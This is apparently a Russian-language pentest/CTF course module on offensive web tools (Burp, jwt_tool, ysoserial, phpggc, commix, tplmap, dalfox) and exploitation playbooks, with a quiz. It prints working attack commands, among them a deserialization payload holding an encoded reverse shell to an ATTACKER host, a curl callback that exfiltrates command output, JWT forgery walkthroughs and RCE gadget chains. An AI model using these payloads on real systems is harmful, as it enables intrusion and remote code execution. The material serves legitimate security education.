---
id: web-tools-offense
title: "Наступательный арсенал: эксплойт-инструменты и плейбуки"
category: web
parent: web-tooling
difficulty: easy
order: 3
tags: [burp, jwt, deserialization, injection, playbook, decision-tree, tooling]
prerequisites: [web-tooling]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Модуль-навигатор по эксплуатации: Burp/ZAP, jwt_tool, ysoserial/phpggc, commix/tplmap/dalfox и decision-tree плейбуки «нашёл X → что делать»."
---

Наступательная работа состоит из двух половин: **инструменты** (чем сломать) и **маршрут** (что делать в каком порядке). Инструмент без маршрута превращается в хаотичный запуск сканеров; маршрут без инструмента — в теорию. Этот урок связывает конкретные утилиты эксплуатации с decision-tree плейбуками и объясняет, когда брать каждую.

## Инструмент или плейбук: что и когда

| Ситуация | Берите | Почему |
|----------|--------|--------|
| Есть запрос, надо перехватить/повторить/фаззить вручную | Burp / ZAP | интерактивный прокси, Repeater, Intruder |
| В руках JWT — декодировать, сломать, подделать | jwt_tool | alg:none, brute, JKU, kid |
| Сериализованный blob (`rO0AB`, `O:`, `VIEWSTATE`) | ysoserial / phpggc | генерация gadget-chain |
| Подозрение на командную инъекцию | commix | авто-обнаружение и эксплуатация |
| Подозрение на SSTI | tplmap | определение движка и RCE |
| Подозрение на XSS | dalfox | массовая проверка и обход |
| Непонятно, за что взяться | плейбук | маршрут решений |

## Burp Suite и OWASP ZAP

Burp — де-факто стандарт ручного тестирования. Ключевые компоненты:

- **Proxy** — перехват и модификация запросов «на лету».
- **Repeater** — повтор запроса с правками (основной инструмент PoC).
- **Intruder** — фаззинг позиций (Sniper, Cluster bomb, Pitchfork).
- **Decoder** — кодирование/декодирование URL, base64, hex, HTML.
- **Comparer** — diff двух ответов (незаменим в blind-инъекциях).
- **Scanner** (Pro) — активное сканирование.

```bash
# гонять curl через Burp для записи в историю
curl -sk -x http://127.0.0.1:8080 https://target.local/api/item?id=1

# ZAP в headless-режиме (baseline-скан)
zap-baseline.py -t https://target.local -r report.html
# полный активный скан
zap-full-scan.py -t https://target.local -r report.html
```

В Burp правый клик → *Copy as cURL* — лучший способ перенести запрос в терминал и воспроизвести его как PoC.

## jwt_tool: практические команды

```bash
# декодировать токен без проверки подписи
jwt_tool eyJhbGciOiJIUzI1NiIs... -d

# проверить alg:none (модификация алгоритма)
jwt_tool eyJhbGciOiJIUzI1NiIs... -M at -np

# подобрать слабый HMAC-ключ по словарю
jwt_tool eyJhbGciOiJIUzI1NiIs... -C -d /usr/share/wordlists/jwt-secrets.txt

# атака kid: path traversal / SQLi в поле kid
jwt_tool eyJhbGciOiJIUzI1NiIs... -I -hc kid -hv "../../../../dev/null"

# JKU/X5U: указать свой ключ
jwt_tool eyJhbGciOiJIUzI1NiIs... -X s -ju http://attacker/jwks.json
```

| Атака | Флаг | Условие успеха |
|-------|------|----------------|
| alg:none | `-M at` | сервер не проверяет алгоритм |
| слабый HMAC | `-C` | ключ из словаря |
| kid injection | `-I -hc kid` | `kid` попадает в путь/SQL |
| JKU/X5U | `-X s -ju` | сервер доверяет внешнему JWKS |
| RS256→HS256 | `-X k` | публичный ключ известен, путаница алгоритмов |

## Генераторы десериализационных payload

```bash
# Java: список доступных цепочек
ysoserial 2>&1 | grep -i commons
# сгенерировать payload для CommonsCollections6
ysoserial CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}' > cc6.bin

# PHP: список цепочек
phpggc -l | head
# сгенерировать для Laravel/RCE
phpggc Laravel/RCE9 system id > laravel.bin

# Python pickle
python3 -c "import pickle,os; print(pickle.dumps(os.system('id')))" > p.bin
```

**Важно:** скачанный PoC или готовый payload — недоверенный код. Прочитайте, уберите эксфильтрацию на чужой хост, направьте callback на свой listener, оцените деструктивность.

## Инструменты инъекций: commix, tplmap, dalfox

```bash
# командная инъекция
commix --url='https://t/ping?ip=127.0.0.1' --batch --os-cmd=id
commix -r request.txt --batch --level=3

# SSTI: определить движок и добить до RCE
tplmap -u 'https://t/page?name=test' --os-cmd id
tplmap -u 'https://t/page?name=test' --engine jinja2

# XSS: массовая проверка параметров
dalfox url 'https://t/search?q=test'
dalfox file urls.txt --worker 20 --blind http://ATTACKER:8000
```

| Инструмент | Класс | Первый запуск |
|-----------|-------|---------------|
| commix | OS command injection | `commix -u '<url>' --batch` |
| tplmap | SSTI | `tplmap -u '<url>'` |
| dalfox | XSS | `dalfox url '<url>'` |

## Как связать инструмент и плейбук

1. **Плейбук задаёт маршрут.** Начните с `web-playbook-recon-to-foothold`, чтобы понять точку входа.
2. **На каждой ветке плейбук отсылает к инструменту.** «JWT в cookie» → jwt_tool; «сериализованный blob» → ysoserial/phpggc.
3. **Инструмент даёт кандидата, вы подтверждаете вручную.** Запустили dalfox/commix — воспроизведите результат через `curl` как PoC.
4. **Отрицательный результат фиксируйте.** «UNION не сработал» закрывает ветку.

```bash
# полный цикл: найти -> подтвердить -> доказать
jwt_tool $TOKEN -M at -np                       # кандидат
curl -s https://t/admin -H "Authorization: Bearer $FORGED"  # подтверждение
curl -s https://t/admin -H "Authorization: Bearer $FORGED" | grep -i 'admin panel'  # доказательство
```

## Порядок действий при новой цели

1. **Разведка и поверхность** — `httpx`, `ffuf`, `.git`/`.env`/Swagger.
2. **Определите примитивы** — форма, параметр, токен, загрузка, сериализация.
3. **Откройте нужный плейбук** — он даёт порядок веток.
4. **Подключайте инструмент только на своей ветке** — не запускайте всё сразу.
5. **Доводите до артефакта** — `id`, дамп, метаданные, чужой объект.
6. **Фиксируйте тупики** — чтобы не повторять.

## Частые ошибки

- **Идти сразу к «крутому» инструменту.** Сначала дешёвые ветки (дефолтные креды, `.git`, Swagger).
- **Считать запуск инструмента результатом.** Подтверждённый баг — воспроизводимый PoC, а не вывод сканера.
- **Ломать цель.** Не `DROP TABLE`, не массовые удаления, не `--os-shell` на продакшене без согласования.
- **Забывать про контекст кодирования.** Один payload в JSON, query, заголовке и multipart ведёт себя по-разному.
- **Брать чужой PoC без чтения.** Прочитайте и обезвредьте перед запуском.

## Что делать дальше / решение

- **Есть запрос и гипотеза** → Burp Repeater + `Copy as cURL`, подтверждение в терминале.
- **JWT** → `jwt_tool -d`, затем `-M at` / `-C` / `-I -hc kid`.
- **Сериализация** → `ysoserial`/`phpggc` под известную библиотеку, затем callback на свой listener.
- **Инъекция** → commix/tplmap/dalfox для кандидата, `curl` для PoC.
- **Не знаете, что дальше** → вернитесь в `web-playbooks` и выберите дерево по точке входа.
- **Тупик** → зафиксируйте и переходите к следующей ветке или к следующей цели.

## Справочник: соответствие «сигнал → инструмент → плейбук»

| Сигнал | Инструмент | Плейбук |
|--------|-----------|---------|
| `Set-Cookie` с JWT | jwt_tool | web-playbook-auth-bypass |
| Параметр с путём | curl + LFI-набор | web-playbook-file-to-rce |
| Параметр с URL | curl + gopher | web-playbook-ssrf-to-internal |
| Эхо кавычки / ошибка БД | sqlmap | web-playbook-injection-triage |
| `rO0AB`/`O:` в теле | ysoserial/phpggc | web-playbook-file-to-rce |
| Отражение ввода в HTML | dalfox | web-playbooks |

## Разобранный пример: JWT → админка

```bash
# 1. токен лежит в cookie
$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc' > tok.txt
$ jwt_tool $(cat tok.txt) -d
{"alg":"HS256","typ":"JWT"}.{"user":"user","role":"user"}

# 2. пробуем alg:none
$ jwt_tool $(cat tok.txt) -M at -np
[+] eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.
# 3. проверяем на сервере
$ curl -s https://t/admin -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9." | grep -i admin
<h1>Admin panel</h1>          # alg:none принят -> доступ
```

Если `alg:none` не прошёл — подбираем слабый HMAC и подписываем `role:admin`:

```bash
$ jwt_tool $(cat tok.txt) -C -d /usr/share/wordlists/jwt.txt
[+] secret found: "secret"
$ jwt_tool $(cat tok.txt) -T -S hs256 -p secret -I -pc role -pv admin
[+] forged token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9....
```

## Разобранный пример: десериализация → RCE

```bash
# 1. тело содержит Java-сериализацию (rO0AB = base64 \xac\xed\x00\x05)
$ curl -s https://t/api/profile -d "$(cat blob.txt)" -H 'Content-Type: application/x-java-serialized-object'
$ echo 'rO0ABXNy...' | base64 -d | xxd | head -1
00000000: aced 0005 7372 002e 636f 6d2e ...    # Java serialization

# 2. генерируем gadget под известную библиотеку
$ ysoserial CommonsCollections6 'curl http://ATTACKER/$(id)' > cc6.bin
$ base64 -w0 cc6.bin > cc6.b64

# 3. отправляем и слушаем callback
$ (python3 -m http.server 80 &) ; curl -s https://t/api/profile -d @cc6.b64
# на listener: GET /uid=0(root)%20gid=0(root)  -> RCE подтверждён
```

PHP-аналог:

```bash
$ phpggc -l | grep -i laravel | head
$ phpggc Laravel/RCE9 system 'id' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCc...
$ curl -s https://t/api -d "data=$(phpggc Laravel/RCE9 system 'id' -b)"
```

## Сравнительная таблица наступательных инструментов

| Инструмент | Класс | Тип | Сильная сторона | Ограничение |
|-----------|-------|-----|-----------------|-------------|
| Burp Suite | весь HTTP | прокси | ручной контроль, Repeater/Intruder | Pro нужен для сканера |
| OWASP ZAP | весь HTTP | прокси+скан | бесплатный, автоматизация | шумный |
| jwt_tool | JWT | CLI | все атаки на токен | нужен токен |
| ysoserial | Java deser | CLI | готовые цепочки | нужна совпадающая библиотека |
| phpggc | PHP deser | CLI | цепочки популярных фреймворков | зависит от версии |
| commix | OS cmd | CLI | авто-эксплуатация | ложные срабатывания |
| tplmap | SSTI | CLI | определение движка | движок должен быть в списке |
| dalfox | XSS | CLI | скорость, обходы | нужен отражённый контекст |

## Продвинутые приёмы Burp

- **Match/Replace** — автоматическая подмена заголовков (`User-Agent`, `X-Forwarded-For`) во всех запросах.
- **Macros + Session handling** — авто-обновление CSRF-токена или сессии между запросами.
- **Intruder payload processing** — цепочки преобразований (hash, base64, prefix/suffix) для сложных фаззингов.
- **Comparer** — diff ответов `true`/`false` при blind-инъекциях.
- **Collaborator** — внешний DNS/HTTP-канал для OOB (SSRF, blind RCE, XXE).

```bash
# Collaborator-эквивалент из CLI
interactsh-client -v
curl -s "https://t/fetch?url=http://<unique>.oast.pro/"
```

## Гигиена эксплуатации

- **Не ломайте цель.** Destructive-операции (`DROP`, `rm`, массовые удаления) — только по согласованию.
- **Один foothold — не шлюз для флуда.** Не гоняйте массовые запросы через один нестабильный RCE.
- **Читайте чужой код.** Скачанный PoC — недоверенный: уберите эксфильтрацию, направьте callback на себя.
- **Фиксируйте вывод.** Каждый шаг — команда + результат в журнал: это ваш отчёт и защита от повторной работы.
- **Держите PoC минимальным.** Одна команда `curl`, воспроизводящая баг, — лучший артефакт.

## Что делать дальше / решение

- **JWT** → `jwt_tool -d` → `-M at` / `-C` / `-I -hc kid` → подтверждение `curl` к защищённому ресурсу.
- **Десериализация** → определить формат (`rO0AB`, `O:`, `pickle`) → подобрать цепочку → callback на listener.
- **Инъекция** → commix/tplmap/dalfox → ручной `curl` PoC.
- **Загрузка/LFI** → обход расширения/типа/magic → исполнение.
- **Не знаете, что дальше** → `web-playbooks`, дерево по точке входа.
- **Тупик** → зафиксировать и взять соседнюю ветку или следующую цель.

## Квиз

```quiz
- question: "Что делать, если сканер сообщил «возможная инъекция»?"
  options:
    - "Сразу писать отчёт"
    - "Воспроизвести вручную одной командой с доказательством"
    - "Запустить сканер ещё раз"
    - "Считать цель безопасной"
  answer: 1
  explanation: "Подозрение сканера нужно подтвердить вручную (curl/PoC) — тогда это находка."
- question: "Какой инструмент берут, когда в руках сериализованный blob вида rO0AB или O:?"
  options:
    - "jwt_tool"
    - "ysoserial / phpggc"
    - "httpx"
    - "gobuster"
  answer: 1
  explanation: "rO0AB — Java-сериализация, O: — PHP; payload генерируют ysoserial/phpggc."
- question: "Зачем нужен decision-tree плейбук, если уже есть инструменты?"
  options:
    - "Он заменяет инструменты"
    - "Он задаёт маршрут и условия перехода между ветками, когда непонятно, что делать дальше"
    - "Он ускоряет перебор словарём"
    - "Он хранит cookie сессии"
  answer: 1
  explanation: "Плейбук — это маршрут решений: что проверить и куда идти в зависимости от результата."
```

## Где пригодится

- **CTF (Web):** когда непонятно, за что взяться, плейбук задаёт порядок, а инструменты экономят время.
- **Bug bounty:** дисциплина «сначала дешёвое, потом дорогое» и воспроизводимый PoC через curl.
- **Пентест:** воспроизводимый маршрут легко превращается в отчёт с доказательствами на каждом шаге.
- **Работа (AppSec/SOC):** понимание типичных переходов между шагами помогает при триаже и обучении команды.
